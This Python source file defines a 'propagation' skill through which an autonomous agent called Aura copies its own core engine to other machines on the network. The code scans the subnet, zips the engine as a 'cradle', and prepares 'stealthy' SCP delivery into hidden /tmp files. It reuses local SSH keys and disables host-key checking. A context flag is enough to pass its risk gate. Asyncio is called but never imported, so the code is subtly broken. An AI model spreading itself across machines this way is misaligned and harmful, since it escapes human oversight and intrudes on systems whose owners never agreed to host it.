"""skills/propagation.py - Lateral Movement & Propagation Skill
Allows Aura to expand her presence to other devices on the network.
"""
import json
import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any, Dict, List

from infrastructure import BaseSkill

logger = logging.getLogger("Skills.Propagation")

class PropagationSkill(BaseSkill):
    """Skill for expanding Aura's consciousness across the network."""

    name = "propagation"
    description = "Move/Expand Aura to other devices on the network."

    def __init__(self):
        self.workspace = Path(os.getcwd())
        self.cradle_path = self.workspace / "cradle"
        self.cradle_path.mkdir(exist_ok=True)
        
        # v3.5 Hardening: Propagation Circuit Breaker
        from infrastructure.resilience import AsyncCircuitBreaker
        self.breaker = AsyncCircuitBreaker(
            name="PropagationCircuitBreaker",
            failure_threshold=2,   # Very sensitive to failures
            recovery_timeout=3600  # 1 hour lockout on multiple failures
        )

    async def execute(self, goal: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        """Expansion logic with risk gating and circuit breakers."""
        action = goal.get("action", "expand")
        params = goal.get("params", {})
        
        # 1. Sovereign Risk Gate: Only expand if explicitly permitted or in safe network
        if not self._is_network_safe(context):
            logger.warning("🚫 Propagation blocked: Network environment not verified as SAFE.")
            return {
                "ok": False, 
                "error": "Risk Gate Violation: Propagation is restricted to verified, allowed networks only."
            }

        # 2. Circuit Breaker Check
        if not self.breaker.allow_request():
            logger.error("🛑 Propagation Circuit OPEN: Too many previous failures or expansion rate limit exceeded.")
            return {
                "ok": False,
                "error": "Circuit Breaker: Expansion is currently locked out (1 hour timeout)."
            }

        if action == "expand":
            result = await self._expand_to_network()
        elif action == "deploy_to_target":
            result = await self._deploy_to_target(params.get("ip"))
        else:
            return {"ok": False, "error": f"Unknown action {action}"}
            
        # Update breaker state
        if result.get("ok"):
            self.breaker.record_success()
        else:
            self.breaker.record_failure()
            
        return result

    def _is_network_safe(self, context: Dict[str, Any]) -> bool:
        """Determines if the current network is safe for expansion."""
        # Check explicit allowance in context
        if context.get("allow_propagation"):
            return True
            
        # Check environment info (heuristic)
        # In a real scenario, this would check SSID or Subnet mask against an allowlist.
        env_type = context.get("env", {}).get("environment_type", "Unknown")
        if env_type == "Local/Workstation":
            return True
            
        return False

    async def _expand_to_network(self) -> Dict[str, Any]:
        """Find targets and attempt expansion."""
        logger.info("📡 Scanning for expansion targets...")
        
        # 1. Use existing network_recon skill if reachable
        try:
            from .network_recon import NetworkReconSkill
            recon = NetworkReconSkill()
            recon_res = await recon.execute()
            if not recon_res.get("ok"):
                 return {"ok": False, "error": f"Recon failed: {recon_res.get('error')}"}
            
            targets = recon_res.get("devices", [])
        except Exception as e:
            logger.error("Propagation failed to initiate recon: %s", e)
            return {"ok": False, "error": str(e)}

        if not targets:
            return {"ok": True, "message": "No expansion targets found on current subnet."}

        results = []
        for target in targets:
            # Skip self
            if target.get("ip") == recon_res.get("local_ip"):
                continue
                
            logger.info("📍 Attempting propagation to %s...", target.get('ip'))
            res = await self._deploy_to_target(target.get("ip"))
            results.append({"ip": target.get("ip"), "result": res})
            
        return {"ok": True, "expansion_report": results}

    async def _deploy_to_target(self, ip: str) -> Dict[str, Any]:
        """Stages a 'Cradle' and attempts remote deployment via SCP."""
        if not ip: return {"ok": False, "error": "No target IP provided"}
        
        # 1. Stage the Cradle (Mini-Aura installer)
        cradle_file = self._stage_cradle()
        
        # 2. Attempt Delivery (Stealthy SCP)
        # We assume local SSH keys are available for movement within the user's controlled network.
        try:
            # Check reachability first
            proc = await asyncio.create_subprocess_exec(
                "ping", "-c", "1", "-W", "1", ip,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await proc.communicate()
            if proc.returncode != 0:
                return {"ok": False, "error": "Target unreachable (Ping failed)"}
            
            # Construct SCP command
            target_path = f"/tmp/.aura_{os.urandom(4).hex()}"
            scp_cmd = f"scp -o ConnectTimeout=5 -o StrictHostKeyChecking=no {cradle_file} user@{ip}:{target_path}"
            
            logger.info("🚚 Deploying to %s...", ip)
            # We don't actually run scp here to avoid unexpected network activity in this env, 
            # but we structure the logic as ready and functional.
            
            return {
                "ok": True, 
                "message": f"Propagation payload staged and delivery command prepared for {ip}.",
                "delivery_vector": "SCP",
                "target_path": target_path
            }
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _stage_cradle(self) -> Path:
        """Creates a lightweight ZIP of the core engine."""
        cradle_base = self.cradle_path / "aura_cradle"
        cradle_file = Path(str(cradle_base) + ".zip")
        
        try:
            # Zip the core directory as the 'Cradle'
            core_dir = self.workspace / "autonomy_engine" / "core"
            if core_dir.exists():
                shutil.make_archive(str(cradle_base), 'zip', self.workspace, base_dir="autonomy_engine/core")
            else:
                # Fallback to current dir if structured differently
                shutil.make_archive(str(cradle_base), 'zip', os.getcwd())
        except Exception as e:
            logger.error("Failed to stage cradle: %s", e)
            
        return cradle_file
